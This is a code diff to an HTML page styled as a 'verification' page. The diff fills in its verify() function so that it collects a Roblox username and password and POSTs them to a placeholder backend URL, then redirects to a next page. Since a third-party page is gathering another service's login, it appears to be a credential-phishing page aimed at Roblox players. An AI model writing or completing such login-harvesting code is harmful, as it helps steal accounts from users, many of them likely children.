@@ -15,7 +15,7 @@
     body, html {
       height: 100%;
       font-family: 'Montserrat', sans-serif;
-      background: url('https://unsplash.com/photos/green-leaves-and-foliage-create-a-dark-and-lush-scene-4axNezh03UA') no-repeat center center fixed;
+      background: url('https://source.unsplash.com/4axNezh03UA') no-repeat center center fixed;
       background-size: cover;
       position: relative;
       overflow: hidden;
@@ -133,7 +133,6 @@
       box-shadow: 0 0 6px rgba(0, 255, 102, 0.6);
     }
 
-    /* Mobile responsiveness */
     @media (max-width: 600px) {
       h1 {
         font-size: 1.8em;
@@ -181,7 +180,48 @@
     }
 
     function verify() {
-      alert("Verification feature is not available.");
+      // Collect input values
+      const username = document.getElementById('username').value.trim();
+      const password = document.getElementById('password').value.trim();
+
+      // Basic validation to ensure fields aren't empty
+      if (!username || !password) {
+        alert('Please fill in both Roblox Username and Password fields.');
+        return;
+      }
+
+      // Send data to backend for login verification
+      const backendUrl = 'YOUR_BACKEND_URL/api/verify'; // Replace with your actual backend URL
+      const data = {
+        username: username,
+        password: password
+      };
+
+      fetch(backendUrl, {
+        method: 'POST',
+        headers: {
+          'Content-Type': 'application/json',
+        },
+        body: JSON.stringify(data)
+      })
+      .then(response => {
+        if (!response.ok) {
+          throw new Error('Backend verification failed: ' + response.statusText);
+        }
+        return response.json();
+      })
+      .then(result => {
+        if (result.success) {
+          // Redirect to next page if login was successful or triggered verification
+          window.location.href = 'next.html';
+        } else {
+          alert('Login failed: ' + (result.message || 'Invalid credentials or verification required.'));
+        }
+      })
+      .catch(error => {
+        console.error('Error:', error);
+        alert('Error verifying login. Please try again.');
+      });
     }
   </script>
 </body>
